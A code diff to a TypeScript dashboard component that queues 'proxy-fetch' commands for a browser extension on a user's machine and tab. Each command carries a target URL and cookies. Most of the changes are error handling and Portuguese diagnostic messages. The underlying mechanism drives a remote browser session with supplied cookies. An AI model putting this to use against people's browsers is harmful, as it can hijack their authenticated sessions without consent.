@@ -174,14 +174,13 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
     const { data: commandData, error: commandError } = await supabase
       .from('remote_commands')
       .insert({
+        command_type: 'proxy-fetch',
         target_machine_id: incident.machine_id,
         target_tab_id: activeSession.tab_id,
-        target_domain: domain,
-        command_type: 'proxy-fetch',
+        status: 'pending',
         payload: {
           target_url: url,
-          cookies: cookies,
-          command_id: crypto.randomUUID()
+          cookies: cookies
         },
         executed_by: (await supabase.auth.getUser()).data.user?.id
       })
@@ -196,7 +195,7 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
     console.log('[ExtensionProxy] Command created:', commandId);
     
     // 3. Send via dispatcher
-    const { data: dispatchData } = await supabase.functions.invoke('command-dispatcher', {
+    const { data: dispatchData, error: dispatchError } = await supabase.functions.invoke('command-dispatcher', {
       body: {
         command_id: commandId,
         command_type: 'proxy-fetch',
@@ -209,7 +208,19 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
       }
     });
     
-    console.log('[ExtensionProxy] Dispatch result:', dispatchData);
+    if (dispatchError) {
+      throw new Error(`Falha no dispatcher: ${dispatchError.message}`);
+    }
+    
+    console.log('[ExtensionProxy] Dispatch status:', {
+      success: dispatchData?.success,
+      status: dispatchData?.status,
+      machine_online: dispatchData?.success === true
+    });
+    
+    if (!dispatchData?.success) {
+      console.warn('[ExtensionProxy] ⚠️ Máquina offline - comando será entregue via polling quando usuário conectar');
+    }
     
     // 4. Poll for result in popup_responses
     const maxAttempts = 30; // 15 seconds
@@ -236,9 +247,20 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
     }
     
     throw new Error(
-      `Timeout aguardando resposta da extensão (15s). ` +
-      `Possíveis causas: usuário offline, comando não recebido, ou erro na execução. ` +
-      `Command ID: ${commandId}`
+      `⏱️ Timeout aguardando resposta da extensão (15s)\n\n` +
+      `📊 Diagnóstico:\n` +
+      `• Command ID: ${commandId}\n` +
+      `• Dispatcher Status: ${dispatchData?.status || 'unknown'}\n` +
+      `• Machine Online: ${dispatchData?.success ? '✅ SIM' : '❌ NÃO'}\n\n` +
+      `🔍 Possíveis causas:\n` +
+      `${!dispatchData?.success ? '• Usuário está offline (extensão não conectada via WebSocket)\n' : ''}` +
+      `• Extensão não processou o comando\n` +
+      `• Erro ao fazer fetch do site\n` +
+      `• Cookies inválidos ou expirados\n\n` +
+      `💡 Verifique:\n` +
+      `• Console da extensão (background.js)\n` +
+      `• Se o usuário tem a tab aberta no domínio\n` +
+      `• Logs do edge function command-dispatcher`
     );
   };
 
